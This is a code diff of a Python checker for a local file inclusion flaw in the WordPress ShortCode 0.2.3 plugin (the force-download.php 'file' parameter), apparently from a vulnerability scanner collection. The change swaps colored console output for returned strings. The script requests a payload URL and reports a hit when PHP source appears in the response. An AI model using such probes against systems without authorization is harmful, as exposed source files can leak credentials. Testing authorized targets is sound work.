@@ -8,8 +8,8 @@ description: 文件force-download.php参数file未过滤存在文件包含漏洞
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class wordpress_plugin_ShortCode_lfi_BaseVerify:
     def __init__(self, url):
@@ -29,12 +29,12 @@ class wordpress_plugin_ShortCode_lfi_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=5, verify=False)
                 if r"<?php" in req.text:
-                    cprint("[+]存在wordpress 插件shortcode0.2.3 本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    return "[+]存在wordpress 插件shortcode0.2.3 本地文件包含漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = wordpress_plugin_ShortCode_lfi_BaseVerify(sys.argv[1])
     testVuln.run()
